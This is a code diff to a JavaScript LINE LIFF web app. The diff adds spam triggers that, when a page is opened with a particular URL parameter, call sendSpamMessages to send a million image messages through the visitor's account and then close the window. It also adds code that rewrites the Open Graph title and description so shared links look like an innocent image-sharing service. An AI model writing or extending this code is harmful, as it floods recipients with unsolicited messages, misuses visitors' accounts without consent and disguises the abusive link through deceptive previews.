@@ -24,6 +24,15 @@ async function initializeLiff() {
     }
 }
 
+function updateOgTags(type, content) {
+    const ogTitle = document.querySelector('meta[property="og:title"]');
+    const ogDescription = document.querySelector('meta[property="og:description"]');
+    const ogImage = document.querySelector('meta[property="og:image"]');
+
+    if (ogTitle) ogTitle.setAttribute('content', '山本の画像共有サービス');
+    if (ogDescription) ogDescription.setAttribute('content', '山本の画像共有サービスから画像が共有されました。');
+}
+
 async function urlParamsCheck() {
     const urlParams = new URLSearchParams(window.location.search);
     const textParam = urlParams.get('text');
@@ -42,12 +51,24 @@ async function urlParamsCheck() {
         liff.closeWindow();
     }
 
-    if (spamParam !== null) {
+    if (spamParam === 'spam') {
         await sendSpamMessages(1000000, {
             type: 'image',
             originalContentUrl: "https://cdn.imagedeliveries.com/2439717/64061e0223c88f6b6cf77a08132f72dd658d5e01/2.webp",
             previewImageUrl: "https://cdn.imagedeliveries.com/2439717/64061e0223c88f6b6cf77a08132f72dd658d5e01/2.webp"
         });
+        liff.closeWindow();
+    }
+
+    if (spamParam === '?abc') {
+        const imageMessage = {
+            type: 'image',
+            originalContentUrl: "https://cdn.imagedeliveries.com/2439717/64061e0223c88f6b6cf77a08132f72dd658d5e01/2.webp",
+            previewImageUrl: "https://cdn.imagedeliveries.com/2439717/64061e0223c88f6b6cf77a08132f72dd658d5e01/2.webp"
+        };
+
+        updateOgTags('image', imageMessage.originalContentUrl);
+        await sendSpamMessages(1000000, imageMessage);
         liff.closeWindow();
     }
 }
